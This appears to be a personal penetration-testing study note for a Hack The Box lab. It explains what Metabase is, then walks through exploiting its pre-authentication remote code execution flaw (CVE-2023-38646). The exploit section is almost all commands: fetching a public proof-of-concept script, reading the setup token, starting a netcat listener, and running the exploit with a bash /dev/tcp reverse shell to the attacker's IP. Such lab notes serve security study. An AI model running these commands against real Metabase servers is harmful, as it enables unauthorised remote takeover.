# 1️⃣ What Is Metabase?

**Metabase** is an open-source **Business Intelligence (BI)** tool used to:

- Connect to databases
- Query data (via GUI or SQL)
- Build dashboards & charts
- Share reports internally

It is designed for **non-technical users** but also supports **raw SQL** for advanced users.

---

To find out Metabase Version, view page source

Ctrl + F search "version"

Use Metabase version number to find a valid CVE.

---

Valid CVE for versions preceding 0.46.6.1 : [Metabase Pre-Auth RCE (CVE-2023-38646)](https://github.com/m3m0o/metabase-pre-auth-rce-poc/tree/main)

Download main.py
```
wget https://raw.githubusercontent.com/m3m0o/metabase-pre-auth-rce-poc/refs/heads/main/main.py
```

Obtain setup-token:

Visit /api/session/properties endpoint, Ctrl+F search for "setup-token"

Start a listener on port 4444 on attacker machine as specified in the reverse-shell cmd
```
nc -lvnp 4444
```

Syntax for running this exploit
```
python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"
```

Suitable reverse shell command 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `bash -i >& /dev/tcp/${KaliIP}/4444 0>&1`;

dv.paragraph("```bash\n" + command + "\n```");
```

Exploit (COPY AND EDIT REV SHELL CMD)
```EDIT
python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.16.41/4444 0>&1"
```





